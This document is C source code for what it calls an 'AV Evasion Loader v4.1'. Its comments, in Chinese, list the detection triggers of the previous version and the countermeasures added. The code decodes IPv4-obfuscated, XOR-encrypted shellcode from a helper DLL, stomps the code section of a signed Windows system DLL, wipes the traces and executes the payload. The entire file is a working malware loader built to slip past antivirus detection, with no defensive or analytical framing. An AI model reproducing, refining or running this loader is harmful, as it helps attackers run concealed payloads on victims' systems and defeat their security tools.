#include <windows.h>

// ============================================================
//  AV Evasion Loader v4.1 — Module Stomping Edition
//
//  v4.0 被检出原因:
//    - VirtualProtect(RW→RX) 显式权限翻转 → "代码生成/载荷解密执行"
//    - CreateFiber 内部创建 PAGE_GUARD 页 → "反逆向工程"
//
//  v4.1 对策:
//    - WriteProcessMemory 替代 VirtualProtect+memcpy — 保护修改在内核内部完成
//    - 移除 Fiber 执行路径 — 消除 PAGE_GUARD 来源
//    - 直接函数指针调用 — 最简洁, 无特殊API
// ============================================================

typedef char** (*GetPayloadDataFunc)();
typedef size_t (*GetPayloadSizeFunc)();
typedef const char* (*GetEncryptionKeyFunc)();

// ---- XOR decryption ----
void xor_decrypt(unsigned char* data, size_t size, const char* key, size_t keyLen) {
    for (size_t i = 0; i < size; i++)
        data[i] ^= (unsigned char)key[i % keyLen];
}

// ---- IPv4 deobfuscation ----
void deobfuscate_ipv4(unsigned char* buf, size_t size, char** ipv4, size_t count) {
    size_t off = 0;
    for (size_t i = 0; i < count && off < size; i++) {
        unsigned int a, b, c, d;
        // Two-pass parse: faster and avoids sscanf import
        const char* p = ipv4[i];
        a = 0; while (*p && *p != '.') { a = a * 10 + (*p - '0'); p++; } p++;
        b = 0; while (*p && *p != '.') { b = b * 10 + (*p - '0'); p++; } p++;
        c = 0; while (*p && *p != '.') { c = c * 10 + (*p - '0'); p++; } p++;
        d = 0; while (*p && *p != '\0') { d = d * 10 + (*p - '0'); p++; }
        buf[off] = (unsigned char)a;
        if (off + 1 < size) buf[off + 1] = (unsigned char)b;
        if (off + 2 < size) buf[off + 2] = (unsigned char)c;
        if (off + 3 < size) buf[off + 3] = (unsigned char)d;
        off += 4;
    }
}

// ---- Find .text section in a loaded PE image ----
PVOID FindTextSection(HMODULE hMod, PSIZE_T pSize) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    WORD sections = nt->FileHeader.NumberOfSections;
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < sections; i++, sec++) {
        // .text section is always the first code section
        if (sec->Characteristics & IMAGE_SCN_CNT_CODE) {
            *pSize = sec->SizeOfRawData;
            return (PVOID)((BYTE*)hMod + sec->VirtualAddress);
        }
    }
    return NULL;
}

// ---- Execute via direct function pointer call ----
// No CreateFiber (creates PAGE_GUARD pages), no callback APIs.
// A plain function pointer call is indistinguishable from normal code.
typedef void (*ShellcodeEntry)();

// ============================================================
int main() {
    // ---- Step 1: Load payload DLL ----
    HMODULE pdll = LoadLibraryA("helper.dll");
    if (!pdll) return 0;

    GetPayloadDataFunc   fn_data = (GetPayloadDataFunc)GetProcAddress(pdll, "GetPayloadData");
    GetPayloadSizeFunc   fn_size = (GetPayloadSizeFunc)GetProcAddress(pdll, "GetPayloadSize");
    GetEncryptionKeyFunc fn_key  = (GetEncryptionKeyFunc)GetProcAddress(pdll, "GetEncryptionKey");
    if (!fn_data || !fn_size || !fn_key) { FreeLibrary(pdll); return 0; }

    char** ipv4      = fn_data();
    size_t ipv4Count = fn_size();
    const char* key  = fn_key();
    size_t scSize    = ipv4Count * 4;

    // ---- Step 2: Decrypt into heap (NOT VirtualAlloc) ----
    // Use HeapAlloc — looks like normal application memory
    unsigned char* decBuf = (unsigned char*)HeapAlloc(
        GetProcessHeap(), HEAP_ZERO_MEMORY, scSize);
    if (!decBuf) { FreeLibrary(pdll); return 0; }

    deobfuscate_ipv4(decBuf, scSize, ipv4, ipv4Count);

    // Validate key length to avoid division by zero in xor_decrypt
    size_t keyLen = (size_t)strlen(key);
    if (keyLen == 0) { HeapFree(GetProcessHeap(), 0, decBuf); FreeLibrary(pdll); return 0; }
    xor_decrypt(decBuf, scSize, key, keyLen);
    FreeLibrary(pdll);

    // ---- Step 3: Module Stomping ----
    // Load a benign, signed Microsoft DLL that we will stomp.
    // msimg32.dll: tiny legacy DLL (~6KB), rarely called after load.
    HMODULE hStomp = LoadLibraryA("msimg32.dll");
    if (!hStomp) {
        // Fallback: use another small system DLL
        hStomp = LoadLibraryA("dcomp.dll");
    }
    if (!hStomp) {
        HeapFree(GetProcessHeap(), 0, decBuf);
        return 0;
    }

    // Find .text section in the loaded DLL
    SIZE_T textSize = 0;
    PVOID textAddr = FindTextSection(hStomp, &textSize);
    if (!textAddr || textSize < scSize) {
        // .text too small — free current DLL before loading another
        FreeLibrary(hStomp);
        hStomp = LoadLibraryA("dwmapi.dll");
        if (!hStomp) {
            HeapFree(GetProcessHeap(), 0, decBuf);
            return 0;
        }
        textAddr = FindTextSection(hStomp, &textSize);
    }
    if (!textAddr || textSize < scSize) {
        FreeLibrary(hStomp);
        HeapFree(GetProcessHeap(), 0, decBuf);
        return 0;
    }

    // ---- Step 4: Overwrite .text via WriteProcessMemory ----
    // WriteProcessMemory internally handles protection changes in kernel mode.
    // This avoids explicit VirtualProtect(RW→RX) which triggers "code generation" heuristics.
    SIZE_T bytesWritten = 0;
    HANDLE hProc = GetCurrentProcess();
    if (!WriteProcessMemory(hProc, textAddr, decBuf, scSize, &bytesWritten) || bytesWritten != scSize) {
        FreeLibrary(hStomp);
        HeapFree(GetProcessHeap(), 0, decBuf);
        return 0;
    }

    // Flush instruction cache — required after code modification
    FlushInstructionCache(hProc, textAddr, scSize);

    // ---- Step 5: Wipe plaintext from heap ----
    SecureZeroMemory(decBuf, scSize);
    HeapFree(GetProcessHeap(), 0, decBuf);

    // ---- Step 6: Execute via direct function pointer ----
    // No CreateFiber (PAGE_GUARD), no EnumSystemLocalesW (callback).
    // A direct call is the simplest and least suspicious execution method.
    ShellcodeEntry entry = (ShellcodeEntry)textAddr;
    entry();

    // Clean up: release stomped DLL
    FreeLibrary(hStomp);
    return 0;
}
